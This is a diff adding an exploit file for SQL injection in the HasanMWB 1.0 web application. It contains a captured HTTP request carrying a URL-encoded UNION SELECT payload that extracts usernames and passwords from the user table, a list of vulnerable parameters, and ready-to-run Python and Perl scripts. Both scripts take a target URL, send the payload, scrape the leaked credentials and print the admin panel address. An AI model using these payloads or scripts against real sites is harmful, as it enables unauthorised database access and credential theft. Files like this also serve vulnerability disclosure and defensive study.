@@ -1,0 +1,100 @@
+# Exploit Title: HasanMWB 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-12-05
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://sourceforge.net/projects/hasanmwb/
+# Software Link: https://netcologne.dl.sourceforge.net/project/hasanmwb/HasanMWB-v1.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+#GET /PATH/index.php?hsn=category&id=1%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%30%78%33%63%36%38%33%32%33%65%2c%30%78%35%35%37%33%36%35%37%32%33%61%2c%75%73%65%72%6e%61%6d%65%2c%30%78%32%30%32%30%2c%30%78%35%30%36%31%37%33%37%33%33%61%2c%70%61%73%73%77%6f%72%64%2c%30%78%33%63%32%66%36%38%33%32%33%65%20%53%45%50%41%52%41%54%4f%52%20%30%78%33%63%36%32%37%32%33%65%29%20%46%52%4f%4d%20%75%73%65%72%29%2c%33%2c%34%2d%2d%20%2d HTTP/1.1
+#Host: TARGET
+#User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+#Accept-Language: en-US,en;q=0.5
+#Accept-Encoding: gzip, deflate
+#Cookie: PHPSESSID=5lk3medj631el6lb4e77ereee5; 786e332ae62061df5c64a17076aef3ee=0li10seku22m9qr31rr8avemn2
+#DNT: 1
+#Connection: keep-alive
+#Upgrade-Insecure-Requests: 1
+#HTTP/1.1 200 OK
+#Date: Wed, 05 Dec 2018 00:24:09 GMT
+#Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+#X-Powered-By: PHP/5.6.30
+#Expires: Thu, 19 Nov 1981 08:52:00 GMT
+#Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+#Pragma: no-cache
+#Content-Length: 2697
+#Keep-Alive: timeout=5, max=100
+#Connection: Keep-Alive
+#Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 1) 
+#index.php?hsn=page&id=[SQL] / $id = $_GET['id'];
+#index.php?hsn=category&id=[SQL] / $id = $_GET['id'];
+#index.php?hsn=search&q=[SQL] / $qu = $_GET['q'];
+# Etc..
+
+#!/usr/bin/python
+import urllib2
+import re
+
+print """
+         \\\|///
+       \\  - -  //
+        (  @ @ )
+ ----oOOo--(_)-oOOo----
+HasanMWB 1.0 - SQL Injection
+    Ihsan Sencan
+ ---------------Ooooo----
+                (   )
+       ooooO     ) /
+       (   )    (_/
+        \ (
+         \_)
+"""
+ 
+s = raw_input("\nTarget:[http://localhost/[PATH]/] ")
+e = ("index.php?hsn=category&id=1")
+p = ("%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%30%78%33%63%36%38%33%32%33%65%2c%30%78%35%35%37%33%36%35%37%32%33%61%2c%75%73%65%72%6e%61%6d%65%2c%30%78%32%30%32%30%2c%30%78%35%30%36%31%37%33%37%33%33%61%2c%70%61%73%73%77%6f%72%64%2c%30%78%33%63%32%66%36%38%33%32%33%65%20%53%45%50%41%52%41%54%4f%52%20%30%78%33%63%36%32%37%32%33%65%29%20%46%52%4f%4d%20%75%73%65%72%29%2c%33%2c%34%2d%2d%20%2d")
+response = urllib2.urlopen(s+e+p)
+c = response.read()
+up = re.findall(r'<h2>(.*)</h2>', c)
+ 
+print "Server: ", response.info()['server']
+print (up)
+print "Login Url:"+(s)+"panel.php"
+
+
+#!/usr/bin/perl
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
+clear();
+
+print "**************************\n";
+print "HasanMWB 1.0 SQL Injection\n";
+print "Ihsan Sencan\n";
+print "**************************\n";
+
+use LWP::UserAgent;
+print "\nTarget:[http://localhost/[PATH]/] ";
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress...\n";
+print "\n";
+ 
+$E="/index.php?hsn=category&id=%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%30%78%33%63%36%38%33%32%33%65%2c%30%78%35%35%37%33%36%35%37%32%33%61%2c%75%73%65%72%6e%61%6d%65%2c%30%78%32%30%32%30%2c%30%78%35%30%36%31%37%33%37%33%33%61%2c%70%61%73%73%77%6f%72%64%2c%30%78%33%63%32%66%36%38%33%32%33%65%20%53%45%50%41%52%41%54%4f%52%20%30%78%33%63%36%32%37%32%33%65%29%20%46%52%4f%4d%20%75%73%65%72%29%2c%33%2c%34%2d%2d%20%2d";
+$cc = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$cc->agent('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0');
+$host = $target . "".$E."";
+$res = $cc->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/<h2>(.*?)<\/h2>/){ 
+print "[+] Success !!!\n";
+print "\n[+] Detail : $1\n";
+print "$target/panel.php";
+print "\n";
+}
+else{print "\n[-]Not found.\n";
+}
